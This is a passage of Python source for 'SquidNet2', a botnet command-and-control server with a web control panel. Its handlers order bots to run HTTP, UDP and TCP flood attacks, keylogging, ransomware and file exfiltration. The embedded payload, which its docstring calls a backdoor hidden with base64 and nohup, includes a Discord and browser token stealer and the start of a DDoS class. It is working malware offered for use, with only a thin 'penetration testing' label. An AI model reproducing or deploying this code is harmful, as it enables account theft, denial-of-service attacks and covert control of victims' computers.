                                        banned_ip = msg.split()[1]
                                        if banned_ip in self.whitelist:
                                            self.send_to_other("SERVER",name,f"The IP Address specified is in the whitelist! Unwhitelist it to ban it.", conn)
                                        elif banned_ip in self.banlist:
                                            self.send_to_other("SERVER",name,f"The IP Address specified is already in the banlist!", conn)
                                        else:
                                            self.add_to_banlist(banned_ip)
                                            self.send_to_other("SERVER",name,f"IP Address '{banned_ip}' has been banned from the server.", conn)
                                    except:
                                        self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !banip <ip>", conn)
                                elif msg.startswith("!unbanip"):
                                    try:
                                        unbanning_ip = msg.split()[1]
                                        if unbanning_ip not in self.banlist:
                                            self.send_to_other("SERVER",name,f"The IP Address specified is not in the banlist!", conn)
                                        else:
                                            self.rem_fr_banlist(unbanning_ip)
                                            self.send_to_other("SERVER",name,f"IP Address '{unbanning_ip}' has been unbanned from the server.", conn)
                                    except:
                                        self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !unbanip <ip>", conn)
                                elif msg.startswith("!getipbanlist"):
                                    self.send_to_other("SERVER",name,f"IP Ban List: {self.banlist}", conn)
                                elif msg.startswith("!getipwhitelist"):
                                    self.send_to_other("SERVER",name,f"IP White List: {self.whitelist}", conn)
                                elif msg.startswith("!whitelistip"):
                                    try:
                                        whitelist_ip = msg.split()[1]
                                        if whitelist_ip in self.whitelist:
                                            self.send_to_other("SERVER",name,f"The IP Address specified is already in the whitelist!", conn)
                                        elif whitelist_ip in self.banlist:
                                            self.send_to_other("SERVER",name,f"The IP Address specified is in the banlist!", conn)
                                        else:
                                            self.add_to_whitelist(whitelist_ip)
                                            self.send_to_other("SERVER",name,f"IP Address '{whitelist_ip}' has been whitelisted in the server.", conn)
                                    except:
                                        self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !whitelistip <ip>", conn)
                                elif msg.startswith("!unwhitelistip"):
                                    try:
                                        unwhitelist_ip = msg.split()[1]
                                        if unwhitelist_ip not in self.whitelist:
                                            self.send_to_other("SERVER",name,f"The IP Address specified is not in the whitelist!", conn)
                                        else:
                                            self.rem_fr_whitelist(unwhitelist_ip)
                                            self.send_to_other("SERVER",name,f"IP Address '{unwhitelist_ip}' has been unwhitelisted from the server.", conn)
                                    except:
                                        self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !unwhitelistip <ip>", conn)
                                elif msg.startswith("!togglelisten"):
                                    if self.listening == True:
                                        self.listening = False
                                    elif self.listening == False:
                                        self.listening = True
                                    self.log(f"[({datetime.today()})][(INFO)]: Listening for connections has been set to: {self.listening}")
                                    self.adminconn.send(f"\n[(SERVER)]: Listening for connections has been set to: {self.listening}".encode())
                                elif msg.startswith("!stopfocus"):
                                    if not self.focusing:
                                        self.send_to_other("SERVER",name,"You are not focusing on a bot right now!", conn)
                                    else:
                                        self.focusing = False
                                        self.focus_conn = None
                                        self.send_to_other("SERVER",name,f"Stopped focusing on bot {self.focus_botname}.", conn)
                                        self.focus_botname = ""
                                elif msg.startswith("!getbotinfo"):
                                    if len(self.botinfo) == 0:
                                        self.send_to_other("SERVER",name, "There are no bots connected to the Botnet at the moment.", conn)
                                    else:
                                        for bot in self.botinfo:
                                            if "closed" in str(bot[5]):
                                                self.botinfo.remove(bot)
                                            else:
                                                self.send_to_other("SERVER",name,f"Info on Bot {bot[0]} - IP: {bot[1]} Src-Port: {bot[2]} User: {bot[3]} OS: {bot[4]} Conn: {bot[5]}", self.adminconn)
                                elif msg.startswith("!filedownload"):
                                    try:
                                        filename = self.get_filename(msg)
                                        if self.downloading:
                                            self.send_to_other("SERVER",name,"You are already downloading a file from the bot computer!", conn)
                                        else:
                                            if self.focusing:
                                                self.botdownload = open(os.path.join(os.getcwd(),f"{self.ftp_dir}/{filename}"),"wb")
                                                self.downloading = True
                                                self.send_to_other(self.admin_username,self.focus_botname,msg, self.focus_conn, True)
                                                self.send_to_other("SERVER",name,f"Attempting to download file {filename} from {self.focus_botname}. You will not be able to send instructions to any of the bots until the download finishes!", conn)
                                            else:
                                                self.send_to_other("SERVER",name,"You need to be in focus mode to be able to download files from bots(there would be a lot of traffic going on in the server)!", conn)
                                    except:
                                        self.send_to_other("SERVER",name,"Invalid input! Here is the valid input: !filedownload <filename>", conn)
                                else:
                                    if msg.startswith("!stopatk"):
                                        if self.ddosing:
                                            if not self.focusing:
                                                self.ddosing = False
                                                self.send_to_other("SERVER",self.admin_username,"Attempting to stop all DDoS Attacks in the botnet.",self.adminconn)
                                            else:
                                                self.send_to_other("SERVER",self.admin_username,"You are in focus mode! Only the bot you are focusing will stop attacking!",self.adminconn)
                                        elif not self.ddosing:
                                            self.send_to_other("SERVER",self.admin_username,"The Bots are currently not attacking any domain.",self.adminconn)
                                    elif msg.startswith("!keylog"):
                                        self.send_to_other("SERVER",self.admin_username,"Activating Keylogger script on the bots(All of the logged keystrokes will be in a txt file with the bot's name).",self.adminconn)
                                        self.keylogging = True
                                        botnames = self.botname_list
                                        for i in botnames:
                                            try:
                                                keylogfile = open(f"{i}.txt","r")
                                            except:
                                                keylogfile = open(f"{i}.txt","w")
                                                keylogfile.write(f"\nLOGGED KEYSTROKES FOR BOT {i}\n")
                                            keylogfile.close()
                                    elif msg.startswith("!stopkeylog"):
                                        self.keylogging = False
                                        self.send_to_other("SERVER",self.admin_username,"Deactivating Keylogger script on the bots.",self.adminconn)
                                    elif msg.startswith("!ransomware"):
                                        if self.ransomware_active:
                                            if self.focusing:
                                                self.send_to_other("SERVER",name,"Only the bot in focus mode has had the ransomware program activated!", conn)
                                            else:
                                                self.send_to_other("SERVER",name,"Ransomware programs are activating!", conn)
                                                self.send_to_other("SERVER",name,"Payloads are effective!", conn)
                                        else:
                                            self.send_to_other("SERVER",name,"The ransomware has been disabled in the config file. Turn the value assigned to 'ransomware_active' to 't'", conn)
                                    elif msg.startswith("!download"):
                                        try:
                                            filename = msg.split()[1]
                                            website =  msg.split()[2]
                                            self.send_to_other("SERVER",self.admin_username,f"Making the bots download contents from '{website}' into file {filename}",self.adminconn)
                                        except:
                                            self.send_to_other("SERVER",name,"Invalid input! Here is the valid input: !download <filename> <website>", conn)
                                    elif msg.startswith('!httpflood'):
                                        if self.ddosing:
                                            self.send_to_other("SERVER",self.admin_username,"There is already an ongoing DDoS Attack! Please stop the attack if you want to start a new one(input '!stopatk').",self.adminconn)
                                        else:
                                            msgtobot = msg.split()
                                            if self.focusing:
                                                self.send_to_other("SERVER",self.admin_username,"You are in focus mode! Only the bot you are focusing will start attacking!",self.adminconn)
                                            else:
                                                self.ddosing = True
                                            try:
                                                targ_website = msgtobot[1]
                                                atk_delay = float(msgtobot[2])
                                                self.send_to_other("SERVER",self.admin_username,f"Beginning HTTP Flood Attack on {targ_website} with delay of {atk_delay}.",self.adminconn)
                                            except:
                                                self.send_to_other("SERVER",name,"Invalid input! Here is the valid input: !httpflood <website> <atk_delay>", conn)
                                    elif msg.startswith('!udpflood') or msg.startswith("!tcpflood"):
                                        if self.ddosing:
                                            self.send_to_other("SERVER",self.admin_username,"There is already an ongoing DDoS Attack! Please stop the attack if you want to start a new one(input '!stopatk').",self.adminconn)
                                        else:
                                            if self.focusing:
                                                self.send_to_other("SERVER",self.admin_username,"You are in focus mode! Only the bot you are focusing will start attacking!",self.adminconn)
                                            else:
                                                self.ddosing = True
                                            if msg.startswith('!udpflood'):
                                                protocol = "UDP"
                                            elif msg.startswith("!tcpflood"):
                                                protocol = "TCP"
                                            msgtobot = msg.split()
                                            try:
                                                target = msgtobot[1]
                                                try:
                                                    port = int(msgtobot[2])
                                                except:
                                                    port = 80
                                                try:
                                                    delay = float(msgtobot[3])
                                                except:
                                                    delay = 0
                                                self.send_to_other("SERVER",self.admin_username,f"Beginning {protocol} Flood Attack on {target}:{port} with delay of {delay}.",self.adminconn)
                                            except:
                                                self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !{protocol.lower()}flood <ip> <port> <delay>", conn)
                                    if not self.focusing and not self.downloading:
                                        if msg.strip() != "":
                                            self.log(f"[({datetime.today()})][({self.admin_username})--->(BOTS)]: {msg}")
                                            display_single_msg = False
                                            for bot in self.connlist:
                                                try:
                                                    if conn != bot:
                                                        if msg.startswith("!ransomware") and not self.ransomware_active:
                                                            pass
                                                        else:
                                                            bot.send(msg.encode())
                                                except:
                                                    pass
                                    else:
                                        if not self.downloading:
                                            if msg.strip() != "":
                                                display_single_msg = False
                                                self.log(f"[({datetime.today()})][({self.admin_username})--->({self.focus_botname})]: {msg}")
                                                self.focus_conn.send(msg.encode())
                            elif self.filetransfer:
                                if msg.startswith("!help"):
                                    self.adminconn.send(self.file_transfer_help_msg.encode())
                                    self.log(f"[({datetime.today()})][(SERVER)--->({self.admin_username})]: Sent the FTP Help message.")
                                elif msg.startswith("!download"):
                                    try:
                                        filename = self.get_filename(msg)
                                        try:
                                            file = open(os.path.join(os.getcwd(),f"{self.ftp_dir}/{filename}"),"rb")
                                            file.close()
                                        except:
                                            pass
                                        self.send_to_other("SERVER",name, f"Preparing to download file: {file.name}.", conn)
                                        self.send_file(filename, conn)
                                    except FileNotFoundError:
                                        self.send_to_other("SERVER",name,f"The file specified does not exist!", conn)
                                    except Exception as e:
                                        self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !download <file>", conn)
                                elif msg.startswith("!listdir"):
                                    dirlist = os.listdir(path=os.path.join(os.getcwd(), self.ftp_dir))
                                    self.send_to_other("SERVER",name,f"Files extracted from bots: {dirlist}",conn)
                                elif msg.startswith("!stopftp"):
                                    self.send_to_other("SERVER",name,"De-Activating FTP Mode. Returning to the Botnet. You will be able to send commands to the bots.",conn)
                                    self.filetransfer = False
                        if display_single_msg:
                            if not msg.startswith("!login"):
                                if not msg.startswith("!key") and msg.strip() != "":
                                    self.log(f"[({datetime.today()})][({name})]: {msg}")
                                    if conn != self.adminconn:
                                        try:
                                            self.adminconn.send(f"\n[({name})]: {msg}".encode())
                                        except:
                                            pass
                            else:
                                self.log(f"[({datetime.today()})][({name})]: Attempting to log into the Admin Account.")
            except Exception as e:
                if registered:
                    self.log(f"[({datetime.today()})][(ERROR)]: Closing connection with {name} due to error: {e}")
                if conn == self.adminconn:
                    self.log(f"[({datetime.today()})][(INFO)]: The admin has left the Botnet.")
                    self.adminconn = None
                    self.admin_online = False
                else:
                    try:
                        if registered:
                            self.adminconn.send(f"[(SERVER)]: {name} has disconnected from the Botnet.".encode())
                    except:
                        pass
                if conn == self.focus_conn:
                    self.send_to_other("SERVER",self.admin_username,f"The Bot you were focusing on has disconnected from the Botnet, going back to normal.", self.adminconn)
                    self.focusing = False
                    self.focus_conn = None
                    self.focus_botname = ""
                    self.downloading = False
                try:
                    self.connlist.remove(conn)
                except:
                    pass
                conn.close()
                break
    def Webserver(self):
        """
        # Web Interface Initiation

        Essentially the `__init__()` function but with a webserver. It is better to keep the function
        within the same class, as it makes obtaining data from the main botnet more easy and more bugless.
        
        It binds to `localhost:8000`. If that doesn't work then it will keep binding one port above
        the previous until it can successfully bind an IP and port."""
        self.wip = "localhost"
        self.wport = 8000
        self.webserv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.webserv.bind((self.wip,self.wport))
                break
            except:
                if self.wport >= 65535:
                    self.wport = 0
                self.wport += 1
        self.log(f"[({datetime.today()})][(INFO)]: Web interface binded with 'http://{self.wip}:{self.wport}'")
    def reformat_str(self, string):
        """Turns every strange string into proper characters."""
        return str(string).replace("+", " ").replace("%3C", "<").replace("%3E", ">").replace(
        "%2F", "/").replace("%22", '"').replace("%27", "'").replace("%3D", "=").replace("%2B",
        "+").replace("%3A", ":").replace("%28", "(").replace("%29", ")").replace("%2C", ","
        ).replace("%3B", ";").replace("%20", " ").replace("%3F", "?").replace("%5C", "\\"
        ).replace("%7B", "{").replace("%7D", "}").replace("%24", "$").replace("%0D", "\n"
        ).replace("%0A", "   ").replace("%40","@").replace("%60","`").replace("%21","!"
        ).replace("%92","'").replace("%93",'"')
    def Weblisten(self):
        """Web interface listening for connections."""
        while True:
            try:
                self.webserv.listen()
                conn, ip = self.webserv.accept()
                handler = threading.Thread(target=self.Webhandler,args=(conn,))
                handler.start()
            except:
                pass
    def Webhandler(self, conn):
        """
        # Handling web interface connections

        This function handles the connections of the web interface. Clients connect to it, and
        there will be a packet generated from the `self.webgen_packet` property to then send 
        back to the client. If there are query strings provided in the client's HTTP GET/ header
        then there might be certain things done, such as IP banning, running commands and some
        more things. This function is supposed to be simple, and is only able to parse information
        from one query string.
        """
        try:
            header = conn.recv(10240)
            try:
                header = header.decode()
            except:
                header = str(header)
            query = header.split()[1]
            try:
                query_str = query.replace("/?","").split("=")[0]
                data_str = self.reformat_str(query.replace("/?","").split("=")[1])
            except:
                query_str = ""
                data_str = ""
            if query_str == "cmd":
                for i in self.botinfo:
                    try:
                        i[5].send(data_str.encode())
                        self.log(f"[({datetime.today()})][(WEB)]: Executed Command '{data_str}' via the web interface.")
                    except:
                        pass
            elif query_str == "kick":
                for i in self.botinfo:
                    if i[0] == data_str:
                        try:
                            i[5].close()
                            self.log(f"[({datetime.today()})][(WEB)]: Kicked Bot '{data_str}' via the web interface.")
                        except:
                            pass
            elif query_str == "ipban":
                if data_str not in self.banlist:
                    self.add_to_banlist(data_str)
                    self.log(f"[({datetime.today()})][(WEB)]: Banned IP '{data_str}' via the web interface.")
            elif query_str == "ipunban":
                if data_str in self.banlist:
                    self.rem_fr_banlist(data_str)
                    self.log(f"[({datetime.today()})][(WEB)]: Unbanned IP '{data_str}' via the web interface.")
            elif query_str == "ipwhitelist":
                if data_str not in self.whitelist:
                    self.add_to_whitelist(data_str)
                    self.log(f"[({datetime.today()})][(WEB)]: Whitelisted IP '{data_str}' via the web interface.")
            elif query_str == "ipunwhitelist":
                if data_str in self.whitelist:
                    self.rem_fr_whitelist(data_str)
                    self.log(f"[({datetime.today()})][(WEB)]: Unwhitelisted IP '{data_str}' via the web interface.")
            elif query_str == "kickadmin":
                if data_str == "true":
                    self.adminconn.close()
                    self.log(f"[({datetime.today()})][(WEB)]: Kicked the admin connection via the web interface.")
            conn.send("HTTP/1.0 200 OK\n".encode())
            conn.send("Content-Type: text/html\n\n".encode())
            conn.send(self.web_packet.encode())
            conn.close()
        except Exception as e:
            pass
    @property
    def web_packet(self):
        """
        # The HTML packet sent to the clients

        Function that generates the packet to send to the client once they connect to the webserver.
        This gets information from the main botnet, and displays it here. This makes the web interface
        dynamic, updating as long as you reload.

        Being able to actually learn some HTML in the year has allowed me to create a much better looking
        web page, and making the previous web interface look like child's play.
        """
        pkt = """
<head> 
    <title>SquidNet2 Web Interface</title>
    <style>
        ._div{
            margin-left: auto;
            margin-right: auto;
            background-color: rgba(238, 238, 238,0.75);
        }
        .imgcl{
            width: 25%;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }
        .altext {
            text-align: center;
        }
        h1,h2,h5 {
            color: white;
            text-align: center;
        }
        table {
            border-collapse: collapse;
        }
        body {
            font-family: sans-serif;
            background-color: black;
            background-image: url('https://media.discordapp.net/attachments/927541364781097011/946056834991685632/kali.jpg?width=1778&height=1000');
        }
        #roundedCorners { 
            border-radius: 25px; 
            border-spacing: 0;
        }
        #roundedCorners td, 
        #roundedCorners th { 
            border-bottom: 1px solid rgb(0, 0, 0);
            padding: 10px; 
        }
        #roundedCorners tr:last-child > td {
            border-bottom: none;
        }
        xmp{
            display: inline;
        } 
    </style>
</head>
<body>
    <script>
        function sendreq(query,data){
            var req = new XMLHttpRequest()
            var reqget = `http://localhost:"""+str(self.wport)+"""/?${query}=${data}`
            req.open("GET",reqget)
            req.send()
        }
        function run_cmd(){
            sendreq("cmd",document.ctrlpnl.cmd.value)
        }
        function _banip(){
            sendreq("ipban",document.ctrlpnl.banip.value)
        }
        function _unbanip(){
            sendreq("ipunban",document.ctrlpnl.unbanip.value)
        }
        function _whitelist(){
            sendreq("ipwhitelist",document.ctrlpnl.whitelist.value)
        }
        function _unwhitelist(){
            sendreq("ipunwhitelist",document.ctrlpnl.unwhitelist.value)
        }
        function kickconn(){
            sendreq("kick",document.ctrlpnl.kick.value)
        }
        function adminkick(){
            sendreq("kickadmin","true")
        }
    </script>"""+f"""
<h1 style="font-size:50px;">SquidNet2 Web Interface</h1>
<h2>The much better and more sophisticated version of SquidNet's original web interface.</h2>
<h1>Server Configuration</h1>
    <table id="roundedCorners" class="_div" style="width:65%;">
        <tr>
            <th>
                Server Settings and Information
            </th>
        </tr>
        <tr>
            <td>
                SquidNet2 Version: {self.version}<br>
                Server IP: {self.ip}<br>
                Server Port: {self.port}<br>
                External IP: {self.external_ip}<br>
                External Port: {self.external_port}<br>
                <br>
                Admin Username: {self.admin_username}<br>
                Admin Password(hash): {self.admin_password}
            </td>
        </tr>
        <tr>
            <td>
                SquidNet2 Log File: <a href="file://{os.path.join(os.getcwd(),self.logfile)}">{os.path.join(os.getcwd(),self.logfile)}</a><br>
                SquidNet2 Payload: <a href="file://{os.path.join(os.getcwd(),self.payloadfile.name)}">{os.path.join(os.getcwd(),self.payloadfile.name)}</a>
                <br>
                My Github: <a href="https://github.com/DrSquidX">DrSquidX</a>
            </td>
        </tr>
    </table>
    <br><br>
    <h1>More Information</h1>
    <table id="roundedCorners" class="_div" style="width:70%;">
        <tr>
            <th>
                About SquidNet2
            </th>
        </tr>
        <tr>
            <td style="word-wrap: break-word;">
                SquidNet is an Open-Source penetration testing script that was designed to take control of computers with the running of a simple payload.
                This script itself is just the server to handle the connections of the bots, and there is an admin script that is needed to actually
                run commands remotely. There are numerous commands that can be used on the server, many of which are able to be used on all all operating
                systems, with a few being exclusive to windows(as it is less secure and more exploitable).
            </td>
        </tr>
    </table>
    <br><br>
    <table id="roundedCorners" class="_div">
        <tr>
            <th>SquidNet2 Commands List for Bots</th>
        </tr>
        <tr>
            <td>
                Utilities command section only usable by the admin!
                <xmp>
                    {self.help_msg}
                </xmp>
            </td>
        </tr>
    </table>
    <h1>Bot Connections</h1>
    <table id="roundedCorners" class="_div">
        <tr>
            <th>Name</th>
            <th>IP Address</th>
            <th>Source Port</th>
            <th>User</th>
            <th>OS</th>
        </tr>
        """
        for i in self.botinfo:
            info = ["<td><xmp>"+str(x)+"</xmp></td>" for x in i[:-1]]
            pkt += f"""
        <tr>
            {"".join([i for i in info])}
        </tr>""" if "closed" not in str(i[5]).lower() else ""
        pkt += "</table>"
        pkt += f"""    <h2>Admin Connected: {self.admin_online}</h2>
    <form name="ctrlpnl">
        <table id="roundedCorners" class="_div">
            <tr>
                <th>SquidNet2 Control Panel</th>
            </tr>
            <tr>
                <td>
                    Output will not be displayed!<br>
                    <input type="text" name="cmd" placeholder="Enter a command to run on the SquidNet." size=40>
                    <input type="button" value="Run" onclick="run_cmd()"><br>
                    <input type="text" name="kick" placeholder="Kick a bot from SquidNet." size=40>
                    <input type="button" value="Kick" onclick="kickconn()"><br>
                    Kick the admin from the SquidNet <input type="button" value="Kick" onclick="adminkick()"><br>
                    <input type="text" name="unbanip" placeholder="Unban an IP from SquidNet." size=40>
                    <input type="button" value="Unban" onclick="_unbanip()"><br>
                    <input type="text" name="banip" placeholder="Ban an IP from SquidNet." size=40>
                    <input type="button" value="Ban" onclick="_banip()"><br>
                    <input type="text" name="whitelist" placeholder="Whitelist an IP in SquidNet." size=40>
                    <input type="button" value="Whitelist" onclick="_whitelist()"><br>
                    <input type="text" name="unwhitelist" placeholder="Unwhitelist an IP in SquidNet." size=40>
                    <input type="button" value="Unwhitelist" onclick="_unwhitelist()"><br>
                </td>
            </tr>
        </table>
    </form>
        """
        pkt += "</body>"
        return pkt
    @property
    def payload(self):
        """
        # The SquidNet2 Payload

        The Payload script is located here. It is generated based on the server variables in the `__init__()` function. 
        This is what the bots use to connect to the server. This script is really a backdoor, which opens the victim to 
        having their computer controlled remotely by the admin. There are a lot of referer and useragent tags, and the 
        reason for that is the DDoS Function. If the user, for whatever reason wants to commit a large scale DDoS Attack, 
        they need to have uniqueness with the HTTP Headers, so that it could help confuse the server they are attacking,
        and eventually bring it down(Servers are really secure nowadays and DDoSing is illegal, so only DDoS Your own 
        servers please). There is also all of the code needed for controlling the bot. The functions are divided into 
        different classes, with the 3 types of DDoS Functions divided into different classes, with the main bot code 
        in one separate class itself. This payload is also encoded into base64 bytes, so it would be hard to figure
        out what it really is at first sight(I figured this out by looking at Metasploit Meterpreter payloads). If
        the victim is on a OSX or Linux operating system, the bot script will execute via the 'nohup' command, so that
        it could run in the background and be more hidden(simply use .pyw py2exe's for Windows machines). This would
        allow the script to run, despite the user closing the application and/or terminal and therefore allow for a 
        longer window to control the victim computer.
        
        The payload itself is expandable and threaded, which means you could have another script running as the payload
        is doing its job. It makes the backdoor more hidden and appears to be something else."""
        payload = """
import socket, threading, os, sys, urllib.request, random, time, shutil, subprocess, sqlite3, string, base64, json, re
try:
    from pynput.keyboard import Listener # pip install pynput
except:
    pass
try:
    import win32crypt # pip install pypiwin32
except:
    pass
try:
    from cryptography.fernet import Fernet # pip install cryptography
except:
    pass
try:
    from Crypto.Cipher import AES # pip install pycryptodome
except:
    pass
class TokenGrab:
    def __init__(self, ):
        self.tokens = []
        self.os = sys.platform 
    def verify_token(self,token):
        period_count = 0
        startswithupper = False
        if list(token)[0] == list(token)[0].upper() and list(token)[0] in string.ascii_letters:
            startswithupper = True
        for i in token:
            if i == ".":
                period_count += 1
        if period_count == 2 and startswithupper:
            return True
        return False
    def grab_token(self,file_name):
        file = open(file_name,"rb")
        content = str(file.read())
        printable = set(string.printable)
        e = filter(lambda x: x in printable, content)
        new_item = ""
        for i in e:
            new_item += i
        newls = new_item.split("\\n")
        tokens = []
        for ii in newls:
            if "oken" in ii:
                item = ii.strip().split('"')
                for iii in item:
                    if len(iii) == 59:
                        if " " not in iii:
                            if self.verify_token(iii):
                                tokens.append(iii)
        return tokens
    def find_tokens(self, path):
        path += '\\\\Local Storage\\\\leveldb' if self.os == "win32" else "/Local Storage/leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            token = self.grab_token(path+("\\\\" if self.os == "win32" else "/" )+file_name)
            tokens.extend(token)
        return tokens
    def main(self):
        self.macdir = ""
        if self.os == "win32":
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            paths = {'Discord': roaming + '\\\\Discord','Discord Canary': roaming + '\\\\discordcanary','Discord PTB': roaming + '\\\\discordptb','Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default','Opera': roaming + '\\\\Opera Software\\\\Opera Stable','Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default','Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'}
        else:
            self.macdir = os.popen("echo ~/library").read().strip().replace("/","\\\\")+"\\Application Support\\\\"
            paths = {"Discord": self.macdir+"discord"}
        for platform, path in paths.items():
            if not os.path.exists(path if self.os == "win32" else path.replace("\\\\","/")):
                continue
            if self.os != "win32":
                path = path.replace("\\\\","/")
            tokens = self.find_tokens(path)
            self.tokens.extend(tokens)
        return self.tokens
class DDoS:
    def __init__(self, ip, delay):
        self.ip = ip
        self.delay = delay
        self.stopatk = False
        self.useragents = self.obtain_user_agents()
        self.referers = self.obtain_referers()
        self.threader = threading.Thread(target=self.start_thr)
        self.threader.start()
    def obtain_referers(self):
        referers = ['http://www.google.com/?q=', 'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..',
                    'http://vk.com/profile.php?redirect=', 'http://www.usatoday.com/search/results?q=',
                    'http://engadget.search.aol.com/search?q=query?=query=..',
                    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882',
                    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925',
                    'http://yandex.ru/yandsearch?text=',
                    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832',
                    'http://go.mail.ru/search?mail.ru=1&q=', 'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..',
                    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..',
                    'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..',
                    'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..',
                    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..',
                    '/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882',
                    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..',
                    'http://www.google.ru/url?sa=t&rct=?j&q=&e..',
                    'http://help.baidu.com/searchResult?keywords=', 'http://www.bing.com/search?q=',
                    'https://www.yandex.com/yandsearch?text=', 'https://duckduckgo.com/?q=',
                    'http://www.ask.com/web?q=',
                    'http://search.aol.com/aol/search?q=', 'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
                    'https://drive.google.com/viewerng/viewer?url=', 'http://validator.w3.org/feed/check.cgi?url=',
                    'http://host-tracker.com/check_page/?furl=',
                    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
                    'http://jigsaw.w3.org/css-validator/validator?uri=', 'https://add.my.yahoo.com/rss?url=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
                    'https://steamcommunity.com/market/search?q=', 'http://filehippo.com/search?q=',
                    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
                    'http://eu.battle.net/wow/en/search?q=',
                    'http://engadget.search.aol.com/search?q=', 'http://careers.gatesfoundation.org/search?q=',
                    'http://techtv.mit.edu/search?q=', 'http://www.ustream.tv/search?q=',
                    'http://www.ted.com/search?q=',
                    'http://funnymama.com/search?q=', 'http://itch.io/search?q=', 'http://jobs.rbs.com/jobs/search?q=',
                    'http://taginfo.openstreetmap.org/search?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=',
                    'https://play.google.com/store/search?q=', 'http://www.tceq.texas.gov/@@tceq-search?q=',
                    'http://www.reddit.com/search?q=', 'http://www.bestbuytheater.com/events/search?q=',
                    'https://careers.carolinashealthcare.org/search?q=', 'http://jobs.leidos.com/search?q=',
                    'http://jobs.bloomberg.com/search?q=', 'https://www.pinterest.com/search/?q=',
                    'http://millercenter.org/search?q=', 'https://www.npmjs.com/search?q=',
                    'http://www.evidence.nhs.uk/search?q=', 'http://www.shodanhq.com/search?q=',
                    'http://ytmnd.com/search?q=',
                    'http://www.google.com/?q=', 'http://www.google.com/?q=', 'http://www.google.com/?q=',
                    'http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=',
